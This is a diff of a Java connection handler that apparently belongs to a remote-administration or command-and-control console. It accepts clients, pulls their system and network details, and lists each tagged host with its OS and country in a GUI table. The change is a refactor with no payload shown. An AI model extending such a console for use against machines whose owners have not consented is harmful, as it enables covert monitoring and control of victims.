@@ -30,20 +30,22 @@ public class Connection implements Runnable {
     public void run() {
         try {
             Socket socket = server.accept();
-            checkIfExistsAndRemove(socket);
+            TableModel tableModel = Main.gui.getConnectionsTable().getModel();
+            int existingClientRow = checkIfExistsAndRemove(socket, tableModel); // position if exists in JTable
             if (dialog.putIfAbsent(socket, new Streams(socket)) == null) {
                 System.out.println("Connected to: " + socket.getRemoteSocketAddress());
                 Streams stream = dialog.get(socket);
+                // System info and modules installed
                 SystemInformation sysInfo = (SystemInformation) stream.sendAction(Action.SYS_INFO);
                 stream.setTempSystemInformation(sysInfo);
+                // Network info
                 NetworkInformation netInfo = (NetworkInformation) stream.sendAction(Action.NET_INFO);
                 stream.setTempNetworkInformation(netInfo);
+                // Change state of JTable add or modify existing client
                 SwingUtilities.invokeLater(() -> {
-                    JTable connectionsTable = Main.gui.getConnectionsTable();
-                    int existingClientRow = checkForExistingClient(connectionsTable, socket);
-                    if (existingClientRow != -1) {
-                        connectionsTable.getModel().setValueAt("Connected", existingClientRow, 5);
-                    } else {
+                    if (existingClientRow != -1) {  // change state of connection
+                        tableModel.setValueAt("Connected", existingClientRow, 5);
+                    } else { // new connection
                         String[] tableRow = new String[]{socket.getInetAddress().toString(),
                                 netInfo.USER_COUNTRY(),
                                 sysInfo.TAG_NAME(),
@@ -51,12 +53,13 @@ public class Connection implements Runnable {
                                 sysInfo.OPERATING_SYSTEM(),
                                 "Connected"
                         };
-                        DefaultTableModel model = (DefaultTableModel) Main.gui.getConnectionsTable().getModel();
-                        model.addRow(tableRow);
+                        DefaultTableModel defaultTableModel = (DefaultTableModel) tableModel;
+                        defaultTableModel.addRow(tableRow);
                     }
                 });
 
             }
+            // FIXME could be removed?
             executor.submit(new Connection(server, executor, dialog));
         } catch (Exception e) {
             System.out.println("Exception on client");
@@ -65,24 +68,24 @@ public class Connection implements Runnable {
         }
     }
 
-    // just search in map
-    private void checkIfExistsAndRemove(Socket socket){
+    /*
+        searches on map for same client inet address and remove
+        from map if exists and returns the index where the client is
+        located in the JTable
+     */
+    private int checkIfExistsAndRemove(Socket socket, TableModel tableModel) {
         for (Map.Entry<Socket, Streams> entry : dialog.entrySet()) {
             if (entry.getKey().getInetAddress().toString().equals(socket.getInetAddress().toString())) {
                 dialog.remove(entry.getKey());
-            }
-        }
-    }
-
-    // search on JTable
-    private int checkForExistingClient(JTable connectionsTable, Socket socket) {
-        TableModel connectionsTableModel = connectionsTable.getModel();
-        for (int i = 0; i < connectionsTable.getModel().getRowCount(); i++) {
-            if (socket.getInetAddress().toString().equals(connectionsTableModel.getValueAt(i, 0))) {
-                return i;
+                for (int i = 0; i < tableModel.getRowCount(); i++) {
+                    if (socket.getInetAddress().toString().equals(tableModel.getValueAt(i, 0))) {
+                        return i;
+                    }
+                }
             }
         }
         return -1;
     }
+
 
 }
